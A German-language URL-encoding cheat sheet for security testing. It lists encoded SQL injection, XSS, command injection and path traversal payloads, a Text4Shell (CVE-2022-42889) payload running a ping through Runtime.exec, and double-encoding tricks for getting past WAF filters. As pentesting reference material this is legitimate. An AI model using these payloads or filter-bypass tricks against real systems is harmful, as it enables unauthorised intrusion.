# URL Encoding Reference

## Standard ASCII Zeichen

| Zeichen | URL Encoded | Beschreibung |
|---------|-------------|--------------|
| ` ` (Space) | `%20` oder `+` | Leerzeichen |
| `!` | `%21` | Ausrufezeichen |
| `"` | `%22` | Anführungszeichen |
| `#` | `%23` | Raute/Hash |
| `$` | `%24` | Dollar |
| `%` | `%25` | Prozent |
| `&` | `%26` | Ampersand |
| `'` | `%27` | Apostroph |
| `(` | `%28` | Klammer auf |
| `)` | `%29` | Klammer zu |
| `*` | `%2A` | Stern |
| `+` | `%2B` | Plus |
| `,` | `%2C` | Komma |
| `/` | `%2F` | Schrägstrich |
| `:` | `%3A` | Doppelpunkt |
| `;` | `%3B` | Semikolon |
| `<` | `%3C` | Kleiner als |
| `=` | `%3D` | Gleichheitszeichen |
| `>` | `%3E` | Größer als |
| `?` | `%3F` | Fragezeichen |
| `@` | `%40` | At-Zeichen |
| `[` | `%5B` | Eckige Klammer auf |
| `\` | `%5C` | Backslash |
| `]` | `%5D` | Eckige Klammer zu |
| `^` | `%5E` | Zirkumflex |
| `_` | `%5F` | Unterstrich (oft nicht nötig) |
| `` ` `` | `%60` | Backtick |
| `{` | `%7B` | Geschweifte Klammer auf |
| `\|` | `%7C` | Pipe |
| `}` | `%7D` | Geschweifte Klammer zu |
| `~` | `%7E` | Tilde |

## Wichtige Steuerzeichen

| Zeichen | URL Encoded | Beschreibung |
|---------|-------------|--------------|
| NULL | `%00` | Null-Byte |
| `\n` | `%0A` | Newline (LF) |
| `\r` | `%0D` | Carriage Return (CR) |
| `\t` | `%09` | Tab |

## Häufige Exploit-Payloads

### SQL Injection
```
'           →  %27
"           →  %22
--          →  %2D%2D
;           →  %3B
' OR '1'='1 →  %27%20OR%20%271%27%3D%271
```

### XSS (Cross-Site Scripting)
```
<script>    →  %3Cscript%3E
</script>   →  %3C%2Fscript%3E
<img src=x  →  %3Cimg%20src%3Dx
onerror=    →  onerror%3D
```

### Command Injection
```
; ls        →  %3B%20ls
| whoami    →  %7C%20whoami
`id`        →  %60id%60
$(whoami)   →  %24%28whoami%29
```

### Path Traversal
```
../         →  %2E%2E%2F
..%2F       →  %2E%2E%252F (doppelt encoded)
..\\        →  %2E%2E%5C
```

### CVE-2022-42889 (Text4Shell)
```
${script:javascript:java.lang.Runtime.getRuntime().exec('ping 192.168.1.184')}
```
**Encoded:**
```
%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27ping%20192.168.1.184%27%29%7D
```

## Double URL Encoding

Manchmal werden Filter durch doppeltes Encoding umgangen:

| Original | Einfach | Doppelt |
|----------|---------|---------|
| `<` | `%3C` | `%253C` |
| `>` | `%3E` | `%253E` |
| `/` | `%2F` | `%252F` |
| `\` | `%5C` | `%255C` |

## Unicode/UTF-8 Encoding

| Zeichen | Unicode | Beschreibung |
|---------|---------|--------------|
| `<` | `%u003c` | Kleiner als |
| `>` | `%u003e` | Größer als |
| `'` | `%u0027` | Apostroph |
| `"` | `%u0022` | Anführungszeichen |

## Hex Encoding

Für verschiedene Kontexte:

```bash
# URL Hex
\x3c = <
\x3e = >
\x27 = '

# HTML Hex
&#x3c; = <
&#x3e; = >
&#x27; = '
```

## Quick Reference für Burp Suite

```
Decoder Tab verwenden:
1. Plain Text eingeben
2. "Encode as..." → "URL"
3. Für doppeltes Encoding: nochmal "URL" wählen
```

## Python Script für Encoding

```python
import urllib.parse

# Einfaches URL Encoding
payload = "${script:javascript:alert(1)}"
encoded = urllib.parse.quote(payload)
print(encoded)

# Doppeltes Encoding
double_encoded = urllib.parse.quote(encoded)
print(double_encoded)
```

## Bash One-Liner

```bash
# URL encode
echo -n "test payload" | jq -sRr @uri

# Mit curl
curl "http://target.com/search?q=$(echo -n 'payload' | jq -sRr @uri)"
```

## Tipps

1. **Nicht alle Zeichen müssen encoded werden** - alphanumerische Zeichen (`A-Z`, `a-z`, `0-9`) und `-_.~` sind safe
2. **Leerzeichen** können als `%20` oder `+` encoded werden
3. **WAF Bypass** - versuche verschiedene Encoding-Kombinationen
4. **Case Sensitivity** - `%2f` und `%2F` sind identisch
5. **Browser** encoden automatisch - teste mit curl/Burp für Kontrolle

---
*Erstellt für Security Testing & Web Development*
